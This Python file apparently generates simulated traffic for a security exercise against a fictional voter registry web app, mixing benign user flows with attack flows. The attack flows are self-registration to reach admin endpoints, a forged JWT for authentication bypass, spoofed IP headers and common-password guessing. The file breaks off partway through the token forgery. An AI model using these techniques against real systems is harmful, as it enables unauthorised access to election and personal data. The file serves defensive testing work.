import base64
import datetime
import hashlib
import os
import re
import requests
import string
import time
import uuid

from bs4 import BeautifulSoup
from random import Random
from siege.attacker.attacker import Attacker
from siege.core.attack_result import AttackResult
from urllib.parse import urlparse, parse_qs
from voter_registry_data import *


BASE_FRONTEND_URL = "https://register.valverde.vote"
BASE_API_URL = "https://api.register.valverde.vote"
BASE_AUTH_URL = "https://auth.register.valverde.vote"

DEFAULT_TIMEOUT = 5
FIRST_TICK_TIMEOUT = 15


class VoterRegistryAttacker(Attacker):
    RNG_SECRET = b"xr5GITXu4I4a8sZ8nRykbDxi"
    
    def __init__(self, host: str, port: int) -> None:
        super().__init__(host, port)
        
        # Reserve variables for attack context
        self.rng = None
        self.session = None


    def _craft_rng(self, request_type: bytes, request_id: int, tick: int, sequence_no: int) -> Random:
        rng = Random()
        rng.seed(self.RNG_SECRET + request_type + str(request_id).zfill(4).encode() + str(tick).zfill(4).encode() + str(sequence_no).zfill(4).encode() + self.RNG_SECRET)
        return rng


    def _craft_session(self, rng: Random, is_benign: bool) -> requests.Session:
        if is_benign or rng.random() < 0.95:
            user_agent = random_benign_user_agent(rng)
        else:
            user_agent = random_malicious_user_agent(rng)
            
        if is_benign or rng.random() < 0.95:
            ip_address = random_benign_ip_address(rng)
        else:
            ip_address = random_malicious_ip_address(rng)
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": user_agent,
            "X-Forwarded-For": ip_address
        })
        
        session.verify = os.path.join(os.path.dirname(__file__), "server.crt")
        
        return session


    def benign_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        self.rng = self._craft_rng(b"benign", id, tick, sequence_no)
        self.session = self._craft_session(self.rng, is_benign=True)
        self.request_timeout = DEFAULT_TIMEOUT
        if tick == 0:
            # For the first tick, we can increase the timeout to allow for initial setup
            self.request_timeout = FIRST_TICK_TIMEOUT
        
        benign_functions = {
            1: self.benign_request_1,
            2: self.benign_request_2,
            3: self.benign_request_3,
            4: self.benign_request_4,
            5: self.benign_request_5
        }
        
        if id not in benign_functions:
            raise ValueError(f"Unknown benign request ID: {id}")
        
        try:
            return benign_functions[id]()
        except TimeoutError:
            return AttackResult.RESULT_DOWN
        except requests.exceptions.ConnectionError:
            return AttackResult.RESULT_DOWN
        except requests.exceptions.Timeout:
            return AttackResult.RESULT_DOWN
        except AssertionError as e:
            print(f"Assertion error in benign request {id}: {e}")
            return AttackResult.RESULT_FAILURE
        except Exception as e:
            print(f"Unexpected error in benign request {id}: {e}")
            import traceback
            traceback.print_exc()
            return AttackResult.RESULT_FAILURE
        finally:
            # Clean up the session
            self.rng = None
            self.session = None


    def malicious_request(self, id: int, tick: int, sequence_no: int) -> AttackResult:
        self.rng = self._craft_rng(b"malicious", id, tick, sequence_no)
        self.session = self._craft_session(self.rng, is_benign=False)
        
        malicious_functions = {
            1: self.malicious_request_1,
            2: self.malicious_request_2,
            3: self.malicious_request_3,
            4: self.malicious_request_4,
            5: self.malicious_request_5
        }
        
        if id not in malicious_functions:
            raise ValueError(f"Unknown malicious request ID: {id}")
        
        try:
            return malicious_functions[id]()
        except TimeoutError:
            return AttackResult.RESULT_DOWN
        except requests.exceptions.ConnectionError:
            return AttackResult.RESULT_DOWN
        except requests.exceptions.Timeout:
            return AttackResult.RESULT_DOWN
        except AssertionError as e:
            print(f"Assertion error in malicious request {id}: {e}")
            return AttackResult.RESULT_FAILURE
        except Exception as e:
            print(f"Unexpected error in malicious request {id}: {e}")
            return AttackResult.RESULT_FAILURE
        finally:
            # Clean up the session
            self.rng = None
            self.session = None


    def _random_code_verifier_challenge_state(self):
        code_verifier = self.rng.randbytes(48).hex()
        code_challenge = base64.b64encode(hashlib.sha256(code_verifier.encode()).digest()).decode().replace('=', '').replace('+', '-').replace('/', '_')
        state = self.rng.randbytes(16).hex()
        return code_verifier, code_challenge, state


    def _try_front_page_success(self):
        # Access the front page
        r = self.session.get(BASE_FRONTEND_URL + "/", timeout=self.request_timeout)
        r.raise_for_status()
        
        assert "Register to vote, now!" in r.text, "Front page not found or incorrect content"
        assert 'href="/register"' in r.text, "Register link not found on front page"
        
        assert "Find Your Polling Station" in r.text, "Front page not found or incorrect content"
        assert 'href="/lookup"' in r.text, "Lookup link not found on front page"


    def _try_admin_page_success(self):
        # Check if the admin page is accessible
        r = self.session.get(BASE_FRONTEND_URL + "/admin", timeout=self.request_timeout)
        r.raise_for_status()


    def _try_openid_config_success(self):
        # Get openid configuration
        r = self.session.get(BASE_AUTH_URL + "/realms/voter-registry/.well-known/openid-configuration", headers={
            'Accept': 'application/jwk-set+json, application/json',
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        r.raise_for_status()
    
    
    def _try_keycloak_login_page_success(self, state, code_challenge):
        r = self.session.get(f"{BASE_AUTH_URL}/realms/voter-registry/protocol/openid-connect/auth", params={
            'client_id': 'voter-registry-app',
            'redirect_uri': f"{BASE_FRONTEND_URL}/admin/callback",
            'response_type': 'code',
            'scope': 'openid',
            'state': state,
            'code_challenge': code_challenge,
            'code_challenge_method': 'S256',
        }, headers={
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        
        # Get login action URL from the response
        soup = BeautifulSoup(r.text, 'html.parser')
        login_action = soup.find('form', id='kc-form-login')['action']
        assert login_action.startswith(f"{BASE_AUTH_URL}/realms/voter-registry/login-actions/authenticate"), "Login action URL is incorrect"
        
        try:
            registration_link_div = soup.find('div', id='kc-registration')
            registration_anchor = registration_link_div.find('a', href=True)
            registration_link = BASE_AUTH_URL + registration_anchor['href']
        except:
            registration_link = None
        
        return login_action, registration_link


    def _try_keycloak_login_post_success(self, login_action: str, admin_username: str, admin_password: str, expected_state: str):
        # Login with admin credentials
        r = self.session.post(login_action, data={
            'username': admin_username,
            'password': admin_password,
            'credentialId': ''
        }, headers={
            'Origin': 'null',
        }, timeout=self.request_timeout)
        r.raise_for_status()
        
        redirect_url = r.url
        assert redirect_url.startswith(f"{BASE_FRONTEND_URL}"), "Redirect URL after login is incorrect"
        
        parsed_url = urlparse(redirect_url)
        query_params = parse_qs(parsed_url.query)
        
        redirect_url_state = query_params.get('state', [None])[0]
        assert expected_state == redirect_url_state, "State parameter in redirect URL does not match the expected state"
        
        redirect_url_code = query_params.get('code', [None])[0]
        assert redirect_url_code, "Code parameter is missing in the redirect URL"
        
        return redirect_url_code


    def _try_keycloak_login_post_failure(self, login_action: str, admin_username: str, admin_password: str):
        # Login with admin credentials
        r = self.session.post(login_action, data={
            'username': admin_username,
            'password': admin_password,
            'credentialId': ''
        }, headers={
            'Origin': 'null',
        }, timeout=self.request_timeout)
        r.raise_for_status()
        
        redirect_url = r.url
        assert redirect_url.startswith(f"{BASE_AUTH_URL}"), "Redirect URL after intentionally failed login is incorrect"


    def _try_keycloak_register_page_success(self, registration_link: str):
        r = self.session.get(registration_link, timeout=self.request_timeout)
        r.raise_for_status()
        
        # Get register action URL from the response
        soup = BeautifulSoup(r.text, 'html.parser')
        register_action = soup.find('form', id='kc-register-form')['action']
        assert register_action.startswith(f"{BASE_AUTH_URL}/realms/voter-registry/login-actions/registration"), "Register action URL is incorrect"
        
        return register_action


    def _try_keycloak_register_post_success(self, register_action: str, username: str, password: str, email: str, first_name: str, last_name: str, expected_state: str):
        # Register with credentials and info
        r = self.session.post(register_action, data={
            'username': username,
            'password': password,
            'password-confirm': password,
            'email': email,
            'firstName': first_name,
            'lastName': last_name
        }, headers={
            'Origin': 'null',
        }, timeout=self.request_timeout)
        r.raise_for_status()
        
        redirect_url = r.url
        assert redirect_url.startswith(f"{BASE_FRONTEND_URL}"), "Redirect URL after register is incorrect"
        
        parsed_url = urlparse(redirect_url)
        query_params = parse_qs(parsed_url.query)
        
        redirect_url_state = query_params.get('state', [None])[0]
        assert expected_state == redirect_url_state, "State parameter in redirect URL does not match the expected state"
        
        redirect_url_code = query_params.get('code', [None])[0]
        assert redirect_url_code, "Code parameter is missing in the redirect URL"
        
        return redirect_url_code


    def _try_keycloak_token_success(self, redirect_url_code: str, code_verifier: str):
        # Submit code for token
        r = self.session.post(f"{BASE_AUTH_URL}/realms/voter-registry/protocol/openid-connect/token", data={
            'grant_type': 'authorization_code',
            'redirect_uri': f"{BASE_FRONTEND_URL}/admin/callback",
            'code': redirect_url_code,
            'code_verifier': code_verifier,
            'client_id': 'voter-registry-app'
        }, headers={
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        assert r.status_code == 200, f"Token request failed with status code {r.status_code}"
        
        r = r.json()
        assert 'access_token' in r, "Access token is missing in the response"
        assert 'refresh_token' in r, "Refresh token is missing in the response"
        assert 'id_token' in r, "Expires in is missing in the response"
        
        access_token = r['access_token']
        
        return access_token


    def _try_polling_stations_success(self, access_token: str | None = None):
        # Build headers for the request
        if access_token:
            # If access token is provided, use it in the headers
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        else:
            headers = {
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        
        # Get polling stations
        r = self.session.get(BASE_API_URL + "/PollingStation", params={
            'offset': 0,
            'limit': 2500
        }, headers=headers, timeout=self.request_timeout)
        
        assert r.status_code == 200, f"Polling station request failed with status code {r.status_code}"
        response = r.json()
        
        assert len(response['results']) > 0, "Polling stations request returned no results"
        
        return response


    def _try_registration_files_success(self, access_token: str | None = None):
        # Build headers for the request
        if access_token:
            # If access token is provided, use it in the headers
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        else:
            headers = {
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        
        # Get registration files
        r = self.session.get(BASE_API_URL + "/Registration/Files", params={
            'offset': 0,
            'limit': 2500
        }, headers=headers, timeout=self.request_timeout)
        
        assert r.status_code == 200, f"Polling station request failed with status code {r.status_code}"
        response = r.json()
        
        return response


    def _try_voter_registration(self, person: dict, file_path: str, fake_file_name: str, file_content_type: str):
        # Submit voter registration
        r = self.session.post(BASE_API_URL + "/Registration", headers={
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, files={
            'firstName': (None, person['first_name']),
            'lastName': (None, person['last_name']),
            'birthdate': (None, person['birthdate']),
            'photoIdNumber': (None, person['photo_id_number']),
            'streetNumber': (None, person['street_number']),
            'streetName': (None, person['street_name']),
            'city': (None, person['city']),
            'state': (None, person['state']),
            'postalCode': (None, person['postal_code']),
            'addressProof': (fake_file_name, open(file_path, 'rb'), file_content_type)
        }, timeout=self.request_timeout)
        
        return r


    def _try_voter_registration_success(self, person: dict, file_path: str, fake_file_name: str, file_content_type: str):
        # Submit voter registration
        r = self._try_voter_registration(person, file_path, fake_file_name, file_content_type)
        
        r.raise_for_status()
        assert 'registrationNumber' in r.json(), "Registration response does not contain registration number"


    def _try_voter_registration_typo_failure(self, person: dict, file_path: str, fake_file_name: str, file_content_type: str):
        # Submit voter registration
        r = self._try_voter_registration(person, file_path, fake_file_name, file_content_type)
        
        # Check the response
        assert r.status_code == 400, "Registration with typo should have failed"


    def _try_polling_station_lookup(self, address: dict):
        # Submit polling station lookup
        r = self.session.post(BASE_API_URL + "/PollingStation/Lookup", headers={
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, json={
            'streetNumber': str(address['street_number']),
            'streetName': address['street_name'],
            'city': address['city'],
            'state': address['state'],
            'postalCode': address['postal_code'],
        }, timeout=self.request_timeout)
        
        return r
    

    def _try_polling_station_lookup_success(self, address: dict, expected_polling_station: dict):
        # Submit polling station lookup
        r = self._try_polling_station_lookup(address)
        
        polling_station_details = r.json()
        
        assert type(polling_station_details['id']) is int, "Polling station ID is not an integer"
        assert polling_station_details['street_number'] == expected_polling_station['street_number'], "Polling station street number does not match"
        assert polling_station_details['street_name'] == expected_polling_station['street_name'], "Polling station street name does not match"
        assert polling_station_details['city'] == expected_polling_station['city'], "Polling station city does not match"
        assert polling_station_details['state'] == expected_polling_station['state'], "Polling station state does not match"
        assert polling_station_details['postal_code'] == expected_polling_station['postal_code'], "Polling station postal code does not match"
        
        return polling_station_details['id']


    def _try_polling_station_lookup_typo_failure(self, address: dict):
        # Submit polling station lookup with typo
        r = self._try_polling_station_lookup(address)
        
        # Check the response
        assert r.status_code in [400, 404], f"Polling station lookup with typo should have failed, but got status code {r.status_code}"


    def _try_polling_station_page_success(self, polling_station_id: int, expected_polling_station: dict | None):
        r = self.session.get(BASE_API_URL + f"/PollingStation/{polling_station_id}", headers={
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        assert r.status_code == 200, f"Polling station details request failed with status code {r.status_code}"
        polling_station_details = r.json()
        
        # Compare returned and expected
        if expected_polling_station is not None:
            assert type(polling_station_details['id']) is int, "Polling station ID is not an integer"
            assert polling_station_details['id'] == polling_station_id, "Polling station ID does not match the expected ID"
            assert polling_station_details['street_number'] == expected_polling_station['street_number'], "Polling station street number does not match"
            assert polling_station_details['street_name'] == expected_polling_station['street_name'], "Polling station street name does not match"
            assert polling_station_details['city'] == expected_polling_station['city'], "Polling station city does not match"
            assert polling_station_details['state'] == expected_polling_station['state'], "Polling station state does not match"
            assert polling_station_details['postal_code'] == expected_polling_station['postal_code'], "Polling station postal code does not match"
        
        return polling_station_details


    def _try_create_advisory_success(self, access_token: str | None, polling_station_id: int, advisory_text: str, advisory_url: str | None):
        # Craft headers
        if access_token:
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        else:
            headers = {
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        
        # Create advisory
        r = self.session.post(BASE_API_URL + f"/PollingStation/{polling_station_id}/advisory", headers=headers, json={
            'message': advisory_text,
            'url': advisory_url
        }, timeout=self.request_timeout)
        
        assert r.status_code == 201, f"Advisory creation failed with status code {r.status_code}"
        polling_station_copy = r.json()
        assert polling_station_copy['id'] == polling_station_id, "Polling station ID does not match after advisory creation"
        
        # Check if the advisory was added
        advisory_found = False
        for advisory in polling_station_copy['advisories']:
            if advisory['message'] == advisory_text:
                advisory_found = True
                break
        assert advisory_found, "Advisory was not found in the polling station after creation"


    def _try_delete_advisory_success(self, access_token: str, polling_station_id: int, advisory_id: int):
        # Delete advisory
        r = self.session.delete(BASE_API_URL + f"/PollingStation/{polling_station_id}/advisory/{advisory_id}", headers={
            'Authorization': f'Bearer {access_token}',
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        assert r.status_code == 204, f"Advisory deletion failed with status code {r.status_code}"


    def _try_download_file_success(self, access_token: str | None, file_path: str):
        # Craft headers
        if access_token:
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }
        else:
            headers = {
                'Origin': BASE_FRONTEND_URL,
                'Referer': BASE_FRONTEND_URL + "/",
            }

        # Download the registration file
        r = self.session.get(BASE_API_URL + f'/Files', params={
            'path': file_path,
        }, headers=headers, timeout=self.request_timeout)
        
        assert r.status_code == 200, f"Registration file download failed with status code {r.status_code}"
        assert len(r.content) > 0, f"LFI request returned empty content for path"
        
        file_content = r.content
        file_checksum = hashlib.sha256(file_content).hexdigest()
        
        return file_checksum


    def _try_approve_or_reject_file(self, access_token, registration_number: int, approved):
        # Approve or reject the registration file
        r = self.session.post(BASE_API_URL + f'/Registration/Files/{registration_number}', json={
            'approved': approved
        }, headers={
            'Authorization': f'Bearer {access_token}',
            'Origin': BASE_FRONTEND_URL,
            'Referer': BASE_FRONTEND_URL + "/",
        }, timeout=self.request_timeout)
        
        assert r.status_code == 200, f"Registration file approval/rejection failed with status code {r.status_code}"
        assert 'registrationNumber' in r.json(), "Approved/rejected registration file response does not contain registration number"
        if approved:
            assert 'File approved' in r.text, "Approved registration file response does not contain expected text"
        else:
            assert 'File rejected' in r.text, "Rejected registration file response does not contain expected text"


    def _spoof_admin_login(self, admin_username: str, admin_password: str):
        try:
            # Sometimes access front page first
            if self.rng.random() < 0.3:
                self._try_front_page_success()
            
            # Check if the admin page is accessible
            self._try_admin_page_success()
            
            # Sometimes return early
            if self.rng.random() < 0.1:
                return
            
            # Get openid configuration
            self._try_openid_config_success()
            
            # Sometimes return early
            if self.rng.random() < 0.1:
                return
            
            # Generate code challenge
            _, code_challenge, state = self._random_code_verifier_challenge_state()
            
            # Redirect to Keycloak login page
            login_action, _ = self._try_keycloak_login_page_success(state, code_challenge)
            
            # Sometimes return early
            if self.rng.random() < 0.1:
                return
            
            # Login with admin credentials
            self._try_keycloak_login_post_success(login_action, admin_username, admin_password, state)
        except:
            pass


    def _admin_login_success(self, admin_username: str, admin_password: str):
        # Sometimes access front page first
        if self.rng.random() < 0.3:
            self._try_front_page_success()
        
        # Check if the admin page is accessible
        self._try_admin_page_success()
        
        # Get openid configuration
        self._try_openid_config_success()
        
        # Generate code challenge
        code_verifier, code_challenge, state = self._random_code_verifier_challenge_state()
        
        # Redirect to Keycloak login page
        login_action, _ = self._try_keycloak_login_page_success(state, code_challenge)
        
        # Login with admin credentials
        redirect_url_code = self._try_keycloak_login_post_success(login_action, admin_username, admin_password, state)
        
        # Get openid configuration again
        self._try_openid_config_success()
        
        # Get token
        access_token = self._try_keycloak_token_success(redirect_url_code, code_verifier)
        
        # Use the access token to access the admin dashboard
        polling_stations = self._try_polling_stations_success(access_token)
        registration_files = self._try_registration_files_success(access_token)
        
        return access_token, polling_stations, registration_files
    
    
    def _admin_login_failure(self, admin_username: str, admin_password: str):
        # Sometimes access front page first
        if self.rng.random() < 0.3:
            self._try_front_page_success()
        
        # Check if the admin page is accessible
        self._try_admin_page_success()
        
        # Get openid configuration
        self._try_openid_config_success()
        
        # Generate code challenge
        _, code_challenge, state = self._random_code_verifier_challenge_state()
        
        # Redirect to Keycloak login page
        login_action, _ = self._try_keycloak_login_page_success(state, code_challenge)
        
        # Login with admin credentials
        self._try_keycloak_login_post_failure(login_action, admin_username, admin_password)


    def _register_and_login(self, username: str, password: str, email: str, person: dict):
        # Sometimes access front page first
        if self.rng.random() < 0.3:
            self._try_front_page_success()
        
        # Check if the admin page is accessible
        self._try_admin_page_success()
        
        # Get openid configuration
        self._try_openid_config_success()
        
        # Generate code challenge
        code_verifier, code_challenge, state = self._random_code_verifier_challenge_state()
        
        # Redirect to Keycloak login page
        _, registration_link = self._try_keycloak_login_page_success(state, code_challenge)
        if not registration_link:
            raise ValueError("Registration link not found on Keycloak login page")
        
        # Open registration link
        register_action = self._try_keycloak_register_page_success(registration_link)
        
        # Register with credentials and info
        redirect_url_code = self._try_keycloak_register_post_success(register_action, username, password, email, person['first_name'], person['last_name'], state)
        
        # Get openid configuration again
        self._try_openid_config_success()
        
        # Get token
        access_token = self._try_keycloak_token_success(redirect_url_code, code_verifier)
        
        # Use the access token to access the admin dashboard
        polling_stations = self._try_polling_stations_success(access_token)
        registration_files = self._try_registration_files_success(access_token)
        
        return access_token, polling_stations, registration_files


    def _random_typos_in_info(self, info: dict[str, str], excluded_keys: list[str] = []) -> dict:
        info_typoed = info.copy()
        info_keys = [k for k in info.keys() if k not in excluded_keys]
        
        # Number of typos to introduce
        typos = self.rng.randint(1, min(3, len(info_keys) - 1))
        
        # Which info parts to introduce typos in
        info_typo_keys = self.rng.sample(info_keys, k=typos)
        
        for key in info_typo_keys:
            typo_type = self.rng.choice(['copy', 'delete', 'insert'])
            
            # Generate a typo for the selected key
            if typo_type == 'copy':
                # Copy a different key's value
                other_key = self.rng.choice([k for k in info_keys if k != key])
                info_typoed[key] = info[other_key]
            elif typo_type == 'delete':
                # Delete the value for the key
                info_typoed[key] = ''
            elif typo_type == 'insert':
                # Insert a random character into the value
                insert_position = self.rng.randint(0, len(info[key]))
                insert_chars_count = self.rng.randint(2, 6)
                insert_chars = ''.join(self.rng.choices(string.ascii_lowercase + string.digits, k=insert_chars_count))
                info_typoed[key] = info[key][:insert_position] + insert_chars + info[key][insert_position:]
        
        return info_typoed


    def benign_request_1(self) -> AttackResult:
        """
        Successful voter registration.
        
        1. Go to front page.
        2. Click on Register.
        3. Submit Registration.
        4. Check result.
        """
        
        # Generate a random person for registration
        person = random_person(self.rng)
        file_path, fake_file_name, file_content_type = random_person_proof_file(self.rng, person)
        
        person_info = {
            'first_name': person['first_name'],
            'last_name': person['last_name'],
            'birthdate': person['birthdate'],
            'photo_id_number': person['photo_id_number'],
            'street_number': str(person['street_number']),
            'street_name': person['street_name'],
            'city': person['city'],
            'state': person['state'],
            'postal_code': person['postal_code']
        }
        
        # Go to front page
        self._try_front_page_success()
        
        # Click on Register
        # No action needed. It's a single page app.
        
        # Randomly fail the registration
        while self.rng.random() < 0.2:
            # Oops, we made a typo
            person_info_with_typo = self._random_typos_in_info(person_info, excluded_keys=['street_number'])
            
            # Submit Registration with typo
            self._try_voter_registration_typo_failure(person_info_with_typo, file_path, fake_file_name, file_content_type)
        
        # Submit Registration
        self._try_voter_registration_success(person_info, file_path, fake_file_name, file_content_type)
        
        return AttackResult.RESULT_SUCCESS


    def benign_request_2(self) -> AttackResult:
        """
        Voter polling station lookup.
        
        1. Go to front page.
        2. Click on Find Your Polling Station.
        3. Submit Lookup.
        4. Check result.
        """
        
        # Generate a random person for registration
        person = random_person(self.rng)
        
        # Go to front page
        self._try_front_page_success()
        
        # Click on Find Your Polling Station
        # No action needed. It's a single page app.
        
        address = {
            'street_number': str(person['street_number']),
            'street_name': person['street_name'],
            'city': person['city'],
            'state': person['state'],
            'postal_code': person['postal_code'],
        }
        
        if self.rng.random() < 0.2:
            # Randomly fail the lookup
            
            # Oops, we made a typo
            address = self._random_typos_in_info(address, excluded_keys=['street_number'])
            
            # Submit Lookup with typo
            self._try_polling_station_lookup_typo_failure(address)
        else:
            # Submit Lookup
            polling_station_id = self._try_polling_station_lookup_success(address, person['polling_station'])
            
            # Go to polling station page
            self._try_polling_station_page_success(polling_station_id, person['polling_station'])

        return AttackResult.RESULT_SUCCESS


    def benign_request_3(self) -> AttackResult:
        """
        Admin logs in.
        1. Go to admin page.
        2. Log in with admin credentials.
        3. Redirect to admin dashboard.
        """
        
        # Get random admin credentials
        admin_username, admin_password = random_admin_user_credentials(self.rng)
        
        # Fail login sometimes
        if self.rng.random() < 0.2:
            # Oops, we made a typo
            creds = {
                'username': admin_username,
                'password': admin_password
            }
            creds = self._random_typos_in_info({
                'username': creds['username'],
                'password': creds['password']
            })
            admin_username = creds['username']
            admin_password = creds['password']
            
            # Login with incorrect admin credentials
            self._admin_login_failure(admin_username, admin_password)
        else:
            # Log in as admin
            self._admin_login_success(admin_username, admin_password)
        
        return AttackResult.RESULT_SUCCESS


    def benign_request_4(self) -> AttackResult:
        """
        Admin manages polling station advisories.
        1. Go to admin page.
        2. Log in with admin credentials.
        3. Redirect to admin dashboard.
        4. Select polling station.
        5. Add an advisory.
        """
        
        # Get random admin credentials
        admin_username, admin_password = random_admin_user_credentials(self.rng)
        
        # Log in as admin
        access_token, polling_stations_response, registration_files_response = self._admin_login_success(admin_username, admin_password)
        polling_stations = polling_stations_response['results']
        
        # Select a random polling station
        polling_station = random_polling_station(self.rng)
        
        for ps in polling_stations:
            if ps['street_number'] == polling_station['street_number'] and \
               ps['street_name'] == polling_station['street_name'] and \
               ps['city'] == polling_station['city'] and \
               ps['state'] == polling_station['state'] and \
               ps['postal_code'] == polling_station['postal_code']:
                polling_station_id = ps['id']
                break
        else:
            raise ValueError("Polling station not found in the list of polling stations")
        
        # Get polling station
        polling_station_copy = self._try_polling_station_page_success(polling_station_id, polling_station)
        
        if self.rng.random() < 0.1:
            # Randomly do nothing
            return AttackResult.RESULT_SUCCESS
        
        # Randomly delete an advisory, if any exist
        if len(polling_station_copy['advisories']) > 0 and self.rng.random() < 0.7:
            # Select a random advisory to delete
            advisory = self.rng.choice(polling_station_copy['advisories'])
            
            # Check if the advisory can be deleted
            self._try_delete_advisory_success(access_token, polling_station_id, advisory['id'])
            
            return AttackResult.RESULT_SUCCESS
        
        # Choose a random advisory text and URL
        advisory_text, advisory_url = random_advisory_text_and_url(self.rng, polling_station_id, polling_stations)

        # Create advisory
        self._try_create_advisory_success(access_token, polling_station_id, advisory_text, advisory_url)
        
        # Refetch the polling station
        self._try_polling_station_page_success(polling_station_id, polling_station)
        
        return AttackResult.RESULT_SUCCESS


    def benign_request_5(self) -> AttackResult:
        """
        NOTE:
        This request should not be used until a decent amount of registration files are uploaded.
        Benign request #1 is used to upload registration files.
        This request should be scheduled ~30 minutes after #1 starts, to add a good buffer of queued registration files.
        
        Admin approves/rejects a registration file.
        1. Go to admin page.
        2. Log in with admin credentials.
        3. Redirect to admin dashboard.
        4. Approve or reject a registration file (sometimes attempt approving/rejecting non-existent file).
        5. Check result.
        """
        
        # Get random admin credentials
        admin_username, admin_password = random_admin_user_credentials(self.rng)
        
        # Log in as admin
        access_token, _, registration_files_response = self._admin_login_success(admin_username, admin_password)
        registration_files = registration_files_response['results']
        
        assert len(registration_files) > 0, "No registration files available for processing"
        
        # Choose a random registration file from the first 10
        registration_file = self.rng.choice(registration_files[:10])
        assert 'id' in registration_file, "Registration file does not have an ID"
        assert type(registration_file['registrationNumber']) is int, "Registration number is not an integer"
        
        # Find person associated with the registration file
        photo_id_number = registration_file['photo_id_number']
        person = next((p for p in get_people() if p['photo_id_number'] == photo_id_number), None)
        assert person is not None, f"Person with photo ID number {photo_id_number} not found in the dataset"
        
        # Get expected checksum for the registration file
        file_extension = os.path.splitext(registration_file['registrationFile'])[1]
        person_file_checksums = list(person['proof_checksums'].values())
        
        # Randomly download the registration file
        if self.rng.random() < 0.4:
            # Download the registration file
            file_checksum = self._try_download_file_success(access_token, registration_file['registrationFile'])
            assert file_checksum in person_file_checksums, "Downloaded file checksum does not match any expected checksum"
        
            # Randomly make no determination
            if self.rng.random() < 0.5:
                return AttackResult.RESULT_SUCCESS
        
        
        # Randomly approve or reject the registration file
        threshold = 0.95 if registration_file['registrationFileMatchesInfo'] else 0.8
        approved = self.rng.random() < threshold
        
        # Approve/reject the registration file
        self._try_approve_or_reject_file(access_token, registration_file['registrationNumber'], approved)
        
        return AttackResult.RESULT_SUCCESS


    def malicious_request_3(self) -> AttackResult:
        """
        Attacker registers an account with the Keycloak service, and uses to login as admin.
        1. Go to admin page.
        2. Register new account.
        3. Log in with the new account.
        4. Redirect to admin dashboard.
        5. Check result.
        """
        
        # Get random person
        person = random_person(self.rng)
        
        # Generate random credentials
        if self.rng.random() < 0.5:
            username = person['first_name'].lower() + str(self.rng.randint(10000, 9999999))
        else:
            username = person['last_name'].lower() + str(self.rng.randint(10000, 9999999))
            
        # Replace any non-alphanumeric characters with underscores
        username = re.sub(r'[^a-z0-9]', '_', username)
        
        password = self.rng.randbytes(self.rng.randint(6,12)).hex()
        email = f"{username}@valverde.vote"
        
        # Register and login as admin
        access_token, polling_stations_response, registration_files_response = self._register_and_login(username, password, email, person)
        
        return AttackResult.RESULT_SUCCESS


    def malicious_request_2(self) -> AttackResult:
        """
        Authentication bypass via forged token.
        1. Craft an authentication token.
        2. Using the token, go to admin page.
        3. Check result.
        """
        
        # Sometimes, do some spoofing actions
        if self.rng.random() < 0.15:
            # Spoof admin login
            admin_username, _ = random_admin_user_credentials(self.rng)
            admin_password = self.rng.choice(['password', 'admin123', 'letmein', '12345678', self.rng.randbytes(self.rng.randint(12,16)).hex()])
            self._spoof_admin_login(admin_username, admin_password)
        
        def _base64_url_encode(data: bytes) -> str:
            """Base64 URL-safe encode."""
            return base64.b64encode(data).decode('utf-8').rstrip('=').replace('+', '-').replace('/', '_')
        
        def _random_uuid() -> str:
            """Generate a random UUID."""
            return str(uuid.UUID(int=self.rng.getrandbits(128), version=4))
        
        # Pick a random key ID
        KID_OPTIONS = [
            "WzHjiBZxX4U53ksTs2LiE6_-DvmIBvxrCiOj9szO_6k",
            "bYIobrs_Xhurs8OszEbm6tUbjTAtBK7UOAWGLHSWrRM",
            "T0uu_IU87XNZKMC_8OWrBgyu_AEV8xp-7ZhIEXR3ZYo"
            "fLcZuvrcUraQUydSENtegM-dIx7nkOJn3nCByW0Yb2M"
        ]
        
        if self.rng.random() < 0.4:
            kid = _base64_url_encode(self.rng.randbytes(32))
        else:
            kid = self.rng.choice(KID_OPTIONS)
        
        # Craft a fake access token
        headers = {
            'alg': 'RS256',
            'typ': 'JWT',
            'kid': kid
        }
        
        time_now = int(time.time())
        admin_profile = random_admin_user_profile(self.rng)
        
        payload = {
            'exp': time_now + 300,
            'iat': time_now,
            'auth_time': time_now - 1,
            'jti': f'onrtrt:{_random_uuid()}',
            'iss': BASE_AUTH_URL + '/realms/voter-registry',
            'aud': 'voter-registry-app',
            'sub': _random_uuid(),
            'typ': 'Bearer',
            'azp': 'voter-registry-app',
            'sid': _random_uuid(),
            'acr': '1',
            'allowed-origins': [BASE_FRONTEND_URL],
            'resource_access': {
                'voter-registry-app': {
                    'roles': [
                        'manage-stations'
                    ]
                }
            },
            'scope': 'openid profile email',
            'email_verified': False,
            'name': admin_profile['name'],
            'preferred_username': admin_profile['preferred_username'],
            'given_name': admin_profile['given_name'],
            'family_name': admin_profile['family_name'],
            'email': admin_profile['email'],
        }
        
        # Encode headers and payload
        encoded_headers = _base64_url_encode(json.dumps(headers).encode('utf-8'))
